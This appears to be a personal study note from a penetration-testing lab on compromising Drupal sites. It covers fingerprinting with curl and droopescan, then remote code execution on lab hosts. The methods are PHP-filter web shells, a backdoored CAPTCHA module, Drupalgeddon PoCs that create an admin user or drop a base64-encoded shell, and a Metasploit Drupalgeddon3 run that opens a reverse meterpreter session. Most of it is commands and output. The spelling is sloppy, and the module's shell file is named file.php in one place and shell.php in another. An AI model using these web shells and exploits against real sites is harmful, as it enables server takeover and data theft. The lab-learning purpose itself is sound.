Drupla is also a CMS launched in 2001. It allow use of themes and modules.It support using Mysql, POSTgresql and also sqlite can be used if no dbms. It has 43K modules and 3K themes. About 1% site (1.2M) sites run durpla.

## Discovery/Footprinting
Check header and footer message `Powered by Drupal`, durpla logo, `CHANGELOG.txt`, page source, `robots.txt` or `README.txt`

```bash
curl -s http://drupal.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

Another way to identify Drupal CMS is through [nodes](https://www.drupal.org/docs/8/core/modules/node/about-nodes). Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`.

```bash
curl -s http://drupal.inlanefreight.local/node/1 | grep drupal
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<link rel="canonical" href="http://drupal.inlanefreight.local/node/1" />
<link rel="shortlink" href="http://drupal.inlanefreight.local/node/1" />
<link rel="revision" href="http://drupal.inlanefreight.local/node/1" />
        <a href="/user/login" data-drupal-link-system-path="user/login">Log in</a>

```

1. `Administrator`: This user has complete control over the Drupal website.
2. `Authenticated User`: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
3. `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

By default drupal off the `CHANGELOG.txt` and `README.txt` file. so we need to use tools or other ways to enumerate it.
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```

```bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt

<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL "http://drupal.inlanefreight.local/CHANGELOG.txt" was not found on this server.</p></body></html>
```

We can also use droopescan for drupal.  A quick search for Drupal-related [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/Drupal-Drupal.html). 
```bash
droopescan scan drupal -u http://drupal.inlanefreight.local

[+] Plugins found:                                                              
    php http://drupal.inlanefreight.local/modules/php/
        http://drupal.inlanefreight.local/modules/php/LICENSE.txt

[+] No themes found.

[+] Possible version(s):
    8.9.0
    8.9.1
```

Lets assume we take the admin panel of durpla now we want to take RCE. so we need to add php script in page or try another ways. 
Before php version 8 `PHP filter` were possible to login as admin and enabled php filter. 
![[Pasted image 20250919030833.png]]

Add a basic page with anyname and add the script.
![[Pasted image 20250919031026.png]]

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

Change the code from HTML to PHP at end of page and save it.
```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

After version 8 its not installed bydefault so we need to add it y ourself. So we can try to download most recent module from site for checking.

```bash
 wget https://targe/files/projects/php-8.x-1.1.tar.gz
```

Once downloaded go to `Administration` > `Reports` > `Available updates`.
We can also installed it from url.
http://drupal.inlanefreight.local/admin/reports/updates/install
![[Pasted image 20250919032609.png]]

## Uploading a Backdoored Module (Php v>8)
Durplal allow user certain permission to upload modules and  can be found on the drupal.org.
Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

```bash
 wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
 
tar xvf captcha-8.x-1.2.tar.gz

```

Create a file in captcha `file.php`
```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

This will allow to access /module or anyfolder bydefault it not allow to access. Add this in .htaccess file.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

Then again convert into tar file
```shell-session
tar cvf captcha.tar.gz captcha/
```

Upload the Module and then try to access it.
```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

In recent years many vuln have been found.
## Drupalgeddon
Lets try the SQL injection vuln and  try adding a new admin user with this [PoC](https://www.exploit-db.com/exploits/34992) script.
Once an admin user is added, we could log in and enable the `PHP Filter` module to achieve remote code execution.
Provide username and password to create account.
```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

We could also use the [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Metasploit module to exploit this.

## Drupalgeddon2
We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.

```bash
python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
```


```bash
curl http://drupal-dev.inlanefreight.local/hello.txt
```
we can modify this script to give us shell.

First base64 encode the shell
```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

Then add script with command to decode the base64. After this again run script.
```bash
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
 
 python3 drupalgeddon2.py 
```

Now again access the file.
```bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Drupalgeddon3

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.

![[Pasted image 20250919062308.png]]

```bash
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

Module options (exploit/multi/http/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80                                                                                yes       The target port (TCP)
   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   User register form with exec
```

```bash
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid

Server username: www-data (33)


meterpreter > sysinfo

Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
```